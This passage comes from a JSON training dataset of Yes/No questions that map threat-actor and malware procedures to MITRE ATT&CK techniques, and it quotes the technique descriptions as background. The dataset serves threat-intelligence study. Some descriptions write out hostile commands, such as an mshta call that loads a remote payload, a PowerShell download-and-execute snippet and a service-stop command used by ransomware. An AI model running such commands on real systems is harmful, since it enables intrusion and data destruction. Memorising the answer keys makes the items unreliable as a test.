    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure PowerShower has sent HTTP GET and POST requests to C2 servers to send information and receive instructions. a type of technique Modify Registry",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Layer Protocol: Web Protocols: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "question": "Is procedure PowerShower has sent HTTP GET and POST requests to C2 servers to send information and receive instructions. a type of technique Modify Registry",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure BOOSTWRITE has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection. a type of technique Web Service: Dead Drop Resolver.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Obfuscated Files or Information: Encrypted/Encoded File",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Encrypted/Encoded File: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "question": "Is procedure BOOSTWRITE has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection. a type of technique Web Service: Dead Drop Resolver",
      "yes/no": "No.\nThe correct answer is Obfuscated Files or Information: Encrypted/Encoded File",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure During Night Dragon, threat actors used several remote administration tools as persistent infiltration channels. a type of technique Remote Access Software",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Remote Access Software: An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a Windows Service). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).",
      "question": "Is procedure During Night Dragon, threat actors used several remote administration tools as persistent infiltration channels. a type of technique Remote Access Software",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Network Connections Discovery: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>)..\nAnswer in Yes or No.\n\nQuestion: Is procedure During FunnyDream, the threat actors used netstat to discover network connections on remote systems. a type of technique Input Capture: Keylogging",
    "context": "",
    "output": "No.\nThe correct answer is System Network Connections Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Network Connections Discovery: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).",
      "question": "Is procedure During FunnyDream, the threat actors used netstat to discover network connections on remote systems. a type of technique Input Capture: Keylogging",
      "yes/no": "No.\nThe correct answer is System Network Connections Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Lateral Tool Transfer: Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders..\nQ: Is procedure DustySky searches for network drives and removable media and duplicates itself onto them.  related to technique Indicator Removal: File Deletion.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Lateral Tool Transfer",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Lateral Tool Transfer: Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.",
      "question": "Is procedure DustySky searches for network drives and removable media and duplicates itself onto them.  related to technique Indicator Removal: File Deletion",
      "yes/no": "No.\nThe provided context is related to Lateral Tool Transfer",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Windigo has used a script to detect which Linux distribution and version is currently installed on the system. a type of technique Deobfuscate/Decode Files or Information.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with System Information Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure Windigo has used a script to detect which Linux distribution and version is currently installed on the system. a type of technique Deobfuscate/Decode Files or Information",
      "yes/no": "No.\nThe provided context is correlated with System Information Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure GeminiDuke collects information on running processes and environment variables from the victim.  related to technique Remote System Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Process Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Process Discovery: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "question": "Is procedure GeminiDuke collects information on running processes and environment variables from the victim.  related to technique Remote System Discovery",
      "yes/no": "No.\nThe provided context is related to Process Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Permission Groups Discovery: Local Groups: Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups..\nQ: Is procedure Sys10 collects the group name of the logged-in user and sends it to the C2.  related to technique Template Injection.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Permission Groups Discovery: Local Groups",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Permission Groups Discovery: Local Groups: Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
      "question": "Is procedure Sys10 collects the group name of the logged-in user and sends it to the C2.  related to technique Template Injection",
      "yes/no": "No.\nThe correct answer is Permission Groups Discovery: Local Groups",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Network Configuration Discovery: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next..\nQ: Is procedure Woody RAT can retrieve network interface and proxy information.  related to technique System Network Configuration Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Network Configuration Discovery: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "question": "Is procedure Woody RAT can retrieve network interface and proxy information.  related to technique System Network Configuration Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Active Scanning: Vulnerability Scanning: Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application)..\nAnswer in Yes or No.\n\nQuestion: Is procedure Earth Lusca has scanned for vulnerabilities in the public-facing servers of their targets. a type of technique Active Scanning: Vulnerability Scanning",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Active Scanning: Vulnerability Scanning: Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application).",
      "question": "Is procedure Earth Lusca has scanned for vulnerabilities in the public-facing servers of their targets. a type of technique Active Scanning: Vulnerability Scanning",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Network Connections Discovery: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>)..\nQ: Is procedure USBferry can use <code>netstat</code> and <code>nbtstat</code> to detect active network connections.  related to technique System Network Connections Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Network Connections Discovery: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).",
      "question": "Is procedure USBferry can use <code>netstat</code> and <code>nbtstat</code> to detect active network connections.  related to technique System Network Connections Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Non-Standard Port: Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings..\nAnswer in Yes or No.\n\nQuestion: Is procedure HARDRAIN binds and listens on port 443 with a FakeTLS method. a type of technique Office Application Startup: Office Test",
    "context": "",
    "output": "No.\nThe provided context is related to Non-Standard Port",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Non-Standard Port: Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
      "question": "Is procedure HARDRAIN binds and listens on port 443 with a FakeTLS method. a type of technique Office Application Startup: Office Test",
      "yes/no": "No.\nThe provided context is related to Non-Standard Port",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure NanHaiShu uses mshta.exe to load its program and files. a type of technique Create Account: Local Account.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Binary Proxy Execution: Mshta: Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",
      "question": "Is procedure NanHaiShu uses mshta.exe to load its program and files. a type of technique Create Account: Local Account",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Masquerading: Masquerade Task or Service: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate..\nQ: Is procedure SUGARDUMP's scheduled task has been named `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` or `MicrosoftEdgeCrashRepoeterTaskMachineUA`, depending on the Windows OS version.  related to technique Ingress Tool Transfer.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Masquerading: Masquerade Task or Service: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "question": "Is procedure SUGARDUMP's scheduled task has been named `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` or `MicrosoftEdgeCrashRepoeterTaskMachineUA`, depending on the Windows OS version.  related to technique Ingress Tool Transfer",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure NavRAT can download files remotely.  related to technique Ingress Tool Transfer.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "question": "Is procedure NavRAT can download files remotely.  related to technique Ingress Tool Transfer",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure BLINDINGCAN has loaded and executed DLLs in memory during runtime on a victim machine.  related to technique Process Discovery",
    "context": "",
    "output": "No.\nThe provided context is correlated with Shared Modules",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Shared Modules: Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\n\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.\n\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows Native API which is called from functions like `LoadLibrary` at run time.",
      "question": "Is procedure BLINDINGCAN has loaded and executed DLLs in memory during runtime on a victim machine.  related to technique Process Discovery",
      "yes/no": "No.\nThe provided context is correlated with Shared Modules",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Network Configuration Discovery: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next..\nQ: Is procedure LoudMiner used a script to gather the IP address of the infected machine before sending to the C2.  related to technique Exploit Public-Facing Application.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is System Network Configuration Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Network Configuration Discovery: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "question": "Is procedure LoudMiner used a script to gather the IP address of the infected machine before sending to the C2.  related to technique Exploit Public-Facing Application",
      "yes/no": "No.\nThe correct answer is System Network Configuration Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Prestige has attempted to stop the MSSQL Windows service to ensure successful encryption using `C:\\Windows\\System32\\net.exe stop MSSQLSERVER`. a type of technique System Services: Service Execution",
    "context": "",
    "output": "No.\nThe correct answer is Service Stop",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Service Stop: Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible . In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.",
      "question": "Is procedure Prestige has attempted to stop the MSSQL Windows service to ensure successful encryption using `C:\\Windows\\System32\\net.exe stop MSSQLSERVER`. a type of technique System Services: Service Execution",
      "yes/no": "No.\nThe correct answer is Service Stop",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Software Discovery: Security Software Discovery: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform..\nAnswer in Yes or No.\n\nQuestion: Is procedure Comnie attempts to detect several anti-virus products.  related to technique Software Discovery: Security Software Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Software Discovery: Security Software Discovery: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
      "question": "Is procedure Comnie attempts to detect several anti-virus products.  related to technique Software Discovery: Security Software Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
